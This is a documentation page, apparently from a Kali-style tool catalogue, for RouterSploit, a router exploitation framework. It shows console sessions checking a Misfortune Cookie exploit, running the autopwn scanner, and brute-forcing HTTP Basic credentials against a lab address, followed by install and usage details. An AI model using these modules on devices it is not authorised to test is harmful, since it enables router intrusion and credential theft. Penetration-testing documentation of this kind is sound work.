# 🌐 routersploit

### RouterSploit Usage Examples <a href="#routersploit-usage-examples" id="routersploit-usage-examples"></a>

RouterSploit has a number of exploits for different router models and they have the ability to check whether the remote target is vulnerable before sending off an exploit:

```
rsf > use exploits/multi/misfortune_cookie
rsf (Misfortune Cookie) > show options

Target options:

   Name       Current settings     Description
   ----       ----------------     -----------
   port       80                   Target port
   target                          Target address e.g. http://192.168.1.1


rsf (Misfortune Cookie) > set target 192.168.0.2
[+] {'target': '192.168.0.2'}
rsf (Misfortune Cookie) > check
[-] Target is not vulnerable
rsf (Misfortune Cookie) >
```

If stealth is not a requirement, you can attempt to use the **autopwn** scanner module to see if any vulnerabilities can be found:

```
rsf > use scanners/autopwn
rsf (AutoPwn) > show options

Target options:

   Name       Current settings     Description
   ----       ----------------     -----------
   port       80                   Target port
   target                          Target IP address e.g. 192.168.1.1


rsf (AutoPwn) > set target 192.168.0.2
[+] {'target': '192.168.0.2'}
rsf (AutoPwn) > run
[*] Running module...
[-] exploits/fortinet/fortigate_os_backdoor is not vulnerable
[-] exploits/belkin/n150_path_traversal is not vulnerable
[-] exploits/belkin/g_n150_password_disclosure is not vulnerable
[-] exploits/belkin/n750_rce is not vulnerable
[-] exploits/belkin/g_plus_info_disclosure is not vulnerable
[-] exploits/asus/infosvr_backdoor_rce is not vulnerable
[-] exploits/asus/rt_n16_password_disclosure is not vulnerable
[-] exploits/2wire/gateway_auth_bypass is not vulnerable
[-] exploits/technicolor/tc7200_password_disclosure is not vulnerable
[-] exploits/netgear/multi_rce is not vulnerable
[-] exploits/netgear/n300_auth_bypass is not vulnerable
[-] exploits/netgear/prosafe_rce is not vulnerable
[-] exploits/asmax/ar_1004g_password_disclosure is not vulnerable
[-] exploits/asmax/ar_804_gu_rce is not vulnerable
[-] exploits/linksys/wap54gv3_rce is not vulnerable
[-] exploits/linksys/1500_2500_rce is not vulnerable
[-] exploits/multi/misfortune_cookie is not vulnerable
[-] exploits/cisco/ucs_manager_rce is not vulnerable
[-] exploits/dlink/dsl_2750b_info_disclosure is not vulnerable
[-] exploits/dlink/dir_645_password_disclosure is not vulnerable
[-] exploits/dlink/dir_300_600_615_info_disclosure is not vulnerable
[-] exploits/dlink/dir_300_320_615_auth_bypass is not vulnerable
[-] exploits/dlink/dwr_932_info_disclosure is not vulnerable
[-] exploits/dlink/dns_320l_327l_rce is not vulnerable
[-] exploits/dlink/dvg_n5402sp_path_traversal is not vulnerable
[-] exploits/dlink/dir_300_600_rce is not vulnerable
[-] exploits/juniper/screenos_backdoor is not vulnerable
[-] exploits/comtrend/ct_5361t_password_disclosure is not vulnerable
[-] Device is not vulnerable to any exploits!

rsf (AutoPwn) >
```

If all else fails, RouterSploit has a number of **creds** modules that can brute force various services, including HTTP, SSH, and Telnet:

```
rsf > use creds/http_basic_bruteforce
rsf (HTTP Basic Bruteforce) > show options

Target options:

   Name       Current settings     Description
   ----       ----------------     -----------
   port       80                   Target port
   target                          Target IP address or file with target:port (file://)


Module options:

   Name          Current settings                                                        Description
   ----          ----------------                                                        -----------
   path          /                                                                       URL Path
   usernames     admin                                                                   Username or file with usernames (file://)
   passwords     file:///usr/share/routersploit/routersploit/wordlists/passwords.txt     Password or file with passwords (file://)
   threads       8                                                                       Numbers of threads
   verbosity     yes                                                                     Display authentication attempts


rsf (HTTP Basic Bruteforce) > set target 192.168.0.2
[+] {'target': '192.168.0.2'}
rsf (HTTP Basic Bruteforce) > set passwords file:///usr/share/wordlists/nmap.lst
[+] {'passwords': 'file:///usr/share/wordlists/nmap.lst'}
rsf (HTTP Basic Bruteforce) > set verbosity no
[+] {'verbosity': 'no'}
rsf (HTTP Basic Bruteforce) > run
[*] Running module...
[*] Elapsed time:  1.97385120392 seconds
[+] Credentials found!

   Target          Port     Login     Password
   ------          ----     -----     --------
   192.168.0.2     80       admin     password

rsf (HTTP Basic Bruteforce) >
```

***

\


### Packages and Binaries:

#### routersploit <a href="#routersploit" id="routersploit"></a>

This package contains an open-source exploitation framework dedicated to embedded devices. It consists of various modules that aids penetration testing operations:

* exploits - modules that take advantage of identified vulnerabilities.
* creds - modules designed to test credentials against network services.
* scanners - modules that check if target is vulnerable to any exploit.
* payloads - modules that are responsible for generating payloads for various architectures and injection points.
* generic - modules that perform generic attacks.

**Installed size:** `2.14 MB`\
**How to install:** `sudo apt install routersploit`

<details>

<summary>Dependencies:</summary>

* python3
* python3-future
* python3-paramiko
* python3-pysnmp4
* python3-requests

</details>

**routersploit**

```
:~# routersploit -h
/usr/bin/routersploit -m <module> -s "<option> <value>"
```

***

**rsf.py**

```
:~# rsf.py -h
/usr/bin/rsf.py -m <module> -s "<option> <value>"
```

***

Updated on: 2022-Aug-05\


***
